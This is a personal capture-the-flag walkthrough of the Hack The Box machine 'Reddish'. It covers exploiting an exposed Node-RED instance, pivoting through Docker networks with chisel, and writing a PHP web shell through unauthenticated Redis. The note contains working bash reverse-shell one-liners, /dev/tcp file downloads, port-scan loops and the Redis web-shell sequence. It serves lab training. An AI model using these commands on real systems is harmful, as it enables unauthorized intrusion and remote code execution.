# 📦 HTB | reddish

Tags: #📦
Related to: 
See also: [[bash]], [[burpsuite]], [[curl]][[chisel]], [[ifconfig]], [[ip]], [[linenum]], [[nc]], [[netstat]], [[nmap]], [[ping]], [[ping]], [[pkill]], [[python]], [[sum]], [[traceroute]]
Previous: [[01 HTB/HTB]]

- [ ] official walkthrough
- [ ] ippsec

Fingerprint ports, services, and versions:

	nmap -sC -sV -oA nmap/reddish 10.129.172.204		// "Host seems down"
	nmap -sC -sV -oA nmap/reddish -Pn 10.129.172.204	// no results
	
	// scan all ports, quickly => no results
	nmap -sC -sV -oA nmap/allports-reddish -Pn -p0- -T5 --max-retries 0 -v 10.129.172.204
	
	ping 10.129.172.204			// TTL=63; most likely Linux
	
	traceroute 10.129.172.204	// trace packet route
	
```               
traceroute to 10.129.172.204 (10.129.172.204), 30 hops max, 60 byte packets
 1  10.10.16.1 (10.10.16.1)  89.413 ms  191.526 ms  191.530 ms
 2  10.129.172.204 (10.129.172.204)  191.516 ms  191.502 ms  191.489 ms
```
	
	// scan all ports again, quickly
	nmap -sC -sV -oA nmap/allports-reddish -Pn -p0- -T5 --max-retries 0 -v 10.129.172.204
	
```
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
```

Port 1880 reconnaissance:

	firefox 10.129.172.204:1880

```
Cannot GET /
```

	CTRL+U	// view source - nothing interesting
	
Information leak:

	http://10.129.172.204:1880/favicon.ico

Upload to Google Image Search:

```
https://nodered.org/docs/security	// learned how to enumerate from here
```

Intercept on Burp Suite:

Since it cannot do a get request, let's change it to a POST request:

Proxy => Right Click => Change Request Method

```
POST / HTTP/1.1
Host: 10.129.172.204:1880
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Burp Suite => Forward

```
{"id":"bdeddbc78d93f8cfb254b0c4666751c1","ip":"::ffff:10.10.16.10","path":"/red/{id}"}
```

Firefox:

	http://10.129.172.204:1880/red/bdeddbc78d93f8cfb254b0c4666751c1	// disable Intercept
	
```
exec => (Command: whoami) => Deploy	// no output, REMOVE COMMAND
tcp input	=> Connect to Port 4444; at host <my_ip> => Done
tcp output	=> Reply to TCP => Done
connect std in/out/error to tcp output
```

Listen for connection:

	nc -lvnp 4444

```
[object Object]whoami
root
```

We don't have a full shell:

	cd ..
	pwd

```
/node-red
```

Upload enumeration script:

	python3 -m http.server 80		// host script
	nc -lvnp 8000 < LinEnum.sh		// serve script
	cat < /dev/tcp/10.10.16.10/8000	// No such file

	ls -la /bin/sh					// what kind of shell?
	
```
/bin/sh -> dash	// if we used bash we could probably run the enumeration script
```

	ls -la /bin/bash												// it exists
	bash -c "cat < /dev/tcp/10.10.16.10/8000 > /dev/shm/LinEnum.sh"	// get it
	md5sum LinEnum.sh												// good
	bash -c "bash -i /dev/shm/LinEnum.sh"							// the script runs

Let's just get a reverse shell:

	nc -lvnp 8002										// listen
	bash -c "bash -i >& /dev/tcp/10.10.16.12/8002 0>&1"	// connect

Explore:

	cd /
	ls -la			// .dockerenv, looks like we're in a Docker environment
	cd /dev/shm

Enumerate using LinEnum: [^1]

	bash LinEnum.sh

Search to the top of the script output without having to Shift+PgUp:

	<Ctrl+Shift>+F	// search for LinEnum and press Enter until you reach the top

```
Linux version 4.4.0-130-generic (buildd@lgw01-amd64-039) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018

### NETWORKING  ##########################################
[-] Network and IP info:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
17: eth1@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever

[-] ARP history:
172.18.0.1 dev eth0 lladdr 02:42:9a:09:f4:1a REACHABLE


[-] Nameserver(s):
nameserver 127.0.0.11


[-] Default route:
default via 172.18.0.1 dev eth0 


[-] Listening TCP:
State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
LISTEN     0      128              127.0.0.11:36852                    *:*     
LISTEN     0      128                      :::1880                    :::*     


[-] Listening UDP:
State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
UNCONN     0      0                127.0.0.11:53921                    *:*
```

	ifconfig	// command not found
	ip addr		// shows addresses assigned to all network interfaces.

We don't see the IP address from reddish, namely: 10.129.173.95. What we see is:

	172.18.0.2/16
	172.19.0.4/16

Let's scan both subnets:

	vi ipscan.sh

```bash
for ip in $(seq 1 5); do
        ping -c 1 127.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
done
```

	ping -c 1 91.31.2.2 >> /dev/null && echo Online	// address doesn't exist; no output
	ping -c 1 127.0.0.1 >> /dev/null && echo Online	// Online

	for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done

```
Online: 172.18.0.1	// probably gateway
Online: 172.18.0.2	// probably container
```

```
11: eth0@if12: ... inet 172.18.0.2
```

	for ip in $(seq 1 5); do ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.19.0.$ip"; done

````
Online: 172.19.0.1	// probably gateway
Online: 172.19.0.2	// probably container
Online: 172.19.0.3	// probably container	// port 80 open
Online: 172.19.0.4	// our box
````

```
17: eth1@if18: ... inet 172.19.0.4/16	// "our box is 4"
```

Let's portscan .2:

	vi portscan.sh

```bash
for port in 22 25 80 443 8080 8443; do
        (echo w00t > /dev/tcp/172.19.0.2/$port && echo "Open: $port") 2> /dev/null
done
```

^ no result; let's try the other IP:

```bash
for port in 22 25 80 443 8080 8443; do
        (echo w00t > /dev/tcp/172.19.0.3/$port && echo "Open: $port") 2> /dev/null
done
```

```
Open: 80
```

If you didn't want to use bash to portscan you could always search for "static build nmap github" [^2]

	nc -lvnp 80 < nmap						// kali
	cat < /dev/tcp/10.10.16.12/80 > nmap	// target
	chmod +x nmap

	./nmap	// permission denied
	mount

```
shm on /dev/shm ... noexec
```

	mv nmap /tmp
	./nmap -p 80 172.19.0.3

We need to get to 172.19.0.3 but we don't have SSH. Let's use chisel.

Build chisel:

	git clone https://github.com/jpillora/chisel.git
	cd chisel
	go build		// from within git cloned directory 
	du -hs chisel	// 11M

Build smaller:

	go build -ldflags="-s -w"
	du -hs chisel	// 7.8M chisel

```
-s	// disable symbol table
-w	// disable DWARF generation
```

Pack it smaller:

	upx brute chisel
	du -hs chisel	// 3.0M chisel

```
brute	// Quickly get the best compression ratio
```

	./chisel

```
Usage: chisel [command] [--help]

  Version: 0.0.0-src (go1.17.5)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

	cp chisel ~/HTB/Lab/reddish/www

Get chisel to target:

	nc -lvnp 80 < chisel								// serve
	bash -c "cat < /dev/tcp/10.10.16.12/80 > chisel"	// get
	md5sum chisel										// check integrity
	chmod 777 chisel

Reverse pivot:

	chisel server -p 8000 -reverse -v					// 1. Server listens on 8000.	// NOTE THE FINGERPRINT
	./chisel client <kali_box>:8000 ...					// 2. Client connects to server.
	./chisel client <kali_box>:8000 R:8001:<target>:80	// 3. Client: "Hey, I've opened a hole for you (port 8001)."
	./chisel client 10.10.16.12:8000 R:8001:172.19.0.3:80
	
	./chisel client --fingerprint <server_fingerprint> 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:80
	
```
^ this is the secure way to run chisel. Using the server's fingerprint in the client ensures that only you are connecting to the server. Also, specifying 127.0.0.1 limits the tunnel to only people on the local host, not the entire network.
```



So on our kali_box we can:

	curl 127.0.0.1:8001	// run curl on our <kali_box>, out of port 8001, to <target> port 80

```
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./chisel)
```

^ because of the error I'm going to use a pre-compiled version on Github so it is more compatible. [^3]

Try again with precompiled binary:

	curl 127.0.0.1:8001

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>Reddish</title>
        <script src="assets/jquery.js" type="text/javascript"></script>
        <script type="text/javascript">
                                                $(document).ready(function () {
                                                                incrCounter();
                                                    getData();
                                                });

                                                function getData() {
                                                    $.ajax({
                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
                                                        cache: false,
                                                        dataType: "text",
                                                        success: function (data) {
                                                                                        console.log("Number of hits:", data)
                                                        },
                                                        error: function () {
                                                        }
                                                    });
                                                }

                                                function incrCounter() {
                                                    $.ajax({
                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
                                                        cache: false,
                                                        dataType: "text",
                                                        success: function (data) {
                                              console.log("HITS incremented:", data);
                                                        },
                                                        error: function () {
                                                        }
                                                    });
                                                }

                                                /*
                                                        * TODO
                                                        *
                                                        * 1. Share the web folder with the database container (Done)
                                                        * 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
                                                        * ...Still don't know how to complete it...
                                                */
                                                function backupDatabase() {
                                                                $.ajax({
                                                                                url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
                                                                                cache: false,
                                                                                dataType: "text",
                                                                                success: function (data) {
                                                                                        console.log("Database saved:", data);
                                                                                },
                                                                                error: function () {
                                                                                }
                                                                });
                                                }
                </script>
    </head>
    <body><h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
    </body>
</html>
```

One thing I don't like about the way we ran chisel:

	netstat -alnp | grep 8001
	
```
tcp6       0      0 :::8001                 :::*                    LISTEN      30315/chisel
```

It's listening on 0.0·0.0, or in this case :::8001, so anyone on our network or that can get to our kali box can access out tunnels.

Kill chisel:

	pkill -9 chisel

Make chisel only listen on kali box local host:

	./chisel client 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:80

	netstat -nap | grep 8001
	
```
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      30537/chisel 
```

Also look into the --fingerprint

```
--fingerprint

A *strongly recommended* fingerprint string to perform host-key validation against the server's public key. Fingerprint mismatches will close the connection. Fingerprints are generated by hashing the ECDSA public key using SHA256 and encoding the result in base64. Fingerprints must be 44 characters containing a trailing equals (=).
```

	./chisel client --fingerprint wrong 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:80

```
ssh: handshake failed: Invalid fingerprint (76:1b:a6:70:b3:c6:02:d8:da:0d:07:30:ee:16:8d:43)
```

	./chisel client --fingerprint sHdDbOFDB3olEItv0ctnfZk1NM/YilP/H1JPBknIuus= 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:80

```
client: Connected (Latency 1.766882ms)
```

	firefox 127.0.0.1:8001	// It works!
	<Ctrl+U>				// view source

```php
function getData() {
	$.ajax({
		url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits"
```

	firefox http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=get%20hits

```
3
```

```
console.log("Number of hits:", data)	// we're not getting "Number of hits"; we're getting the data.
```

```php
function incrCounter() {
    $.ajax({
        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits"
```

	firefox http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=incr%20hits	// after we visit this
	firefox http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=get%20hits		// this gets incremented

```
4
```

```
/*
* TODO
*
* 	1. Share the web folder with the database container (Done)
* 	2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
* 	...Still don't know how to complete it...
*/
```

```php
function backupDatabase() {
	$.ajax({
		url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=..."
```
										
Let's try #2 and see if we can access files using LFI:

	firefox http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd	// we don't get anything

The note says that the web folder and the database container are shared so let's try to access the database server. It's probably 172.19.0.2. Let's open another reverse shell:

	nc -lvnp 7001
	bash -c "bash -i >& /dev/tcp/10.10.16.12/7001 0>&1"

Modify portscan.sh

```bash
for port in $(seq 0 65535); do
        (echo w00t > /dev/tcp/172.19.0.2/$port && echo "Open: $port") 2> /dev/null
done
```

	<Enter>
	<Enter>

```
Open: 6379
```

Restart our chisel client to open port 6379:

	./chisel client --fingerprint sw4f8cHIX6F/7wUx6dJ8V36X4MgxLcl4tOwymk+6NgI= 10.10.16.12:8000 R:127.0.0.1:6379:172.19.0.3:6379

	nmap -sT -sC -sV -p 6379 localhost

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```

Search for "redis remote command execution". [^4]

	nc localhost 6379

```
echo "Hey no AUTH required!"
$21
Hey no AUTH required!
```

Let's try this on the web server:

Reset chisel client:

	./chisel client --fingerprint bLI2u0S1mmRNO1SPvqR8H1lxfmz9JAXp+f6ZApPLdK8= 10.10.16.12:8000 R:127.0.0.1:8001:172.19.0.3:80
	firefox http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=echo

```
ERR wrong number of arguments for 'echo' command
```

	localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=help echo

```
ERR unknown command 'help'
```

	http://localhost:8001/8924d0549008565c554f8128cd11fda4/ajax.php?test=echo%20%22Hey%20no%20AUTH%20required%22

```
Hey no AUTH required
```

It looks like ajax.php is a direct connection to reddish itself and no auth is required. Let's do the commands we know:

	nc localhost 6379
		flushall
		set PleaseSubscribe "<? system($_REQUEST['ippsec']); ?>"
		config set dbfilename ippsec.php
		config set dir /var/www/html
		save	// we've written a configuration file called ippsec.php to /var/www/html
	
	localhost:8001/ippsec.php

```
REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�K��a�used-mem�(��aof-preamble���pwn%  
**Warning**: system(): Cannot execute a blank command in **/var/www/html/ippsec.php** on line **2**  
��I?�?��
```

	http://localhost:8001/ippsec.php?ippsec=whoami

```
REDIS0008� redis-ver4.0.9� redis-bits�@�ctime¨��a�used-mem¸? �aof-preamble���PleaseSubscribe"www-data ����`5.�
```

Let's send this into Burp:

```
GET /ippsec.php?ippsec=whoami HTTP/1.1
Host: localhost:8001
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

<Ctrl+R> to send to Repeater.
<Ctrl+Shift+R> to switch to Repeater tab.
Click Send

```
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 12:36:24 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.0.30
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 124

REDIS0008ú	redis-ver4.0.9ú
redis-bitsÀ@úctimeÂ±ÖÚaúused-memÂ¸?
```

Repeater => Right Click (Change request method)

```
POST /ippsec.php HTTP/1.1
Host: localhost:8001
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

ippsec=ip addr	// can change executed command here
```

=> Send

```
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 12:38:21 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.0.30
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 860

REDIS0008�      redis-ver4.0.9�
�edis-bits�@�ctime±��aused-mem¸?
 aof-preamble���PleaseSubscribe"1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
13: eth0@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever
15: eth1@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
�p��j��N
```

We have:

- 172.19.0.3/16
- 172.20.0.3/16

The previous container had:

- 172.18.0.2/16
- 172.19.0.4/16

What if only 18 can talk to us but 19 cannot.

Change command in Repeater:

	ippsec=ping -c1 10.10.16.12	// our kali box

```
HTTP/1.1 200 OK
Date: Sun, 09 Jan 2022 12:47:31 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/7.0.30
Vary: Accept-Encoding
Content-Length: 115
Connection: close
Content-Type: text/html; charset=UTF-8

REDIS0008ú	redis-ver4.0.9ú
redis-bitsÀ@úctimeÂDÙÚaúused-memÂ0î
```

This box cannot talk to our machine, but it can talk to the web server so we can do another port forward to listen on the web server and direct it back to us.

References
----
<iframe width="560" height="315" src="https://www.youtube.com/embed/Yp4oxoQIBAM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[^1]: https://github.com/rebootuser/LinEnum.git
[^2]: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
[^3]: https://github.com/jpillora/chisel/releases/
[^4]: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html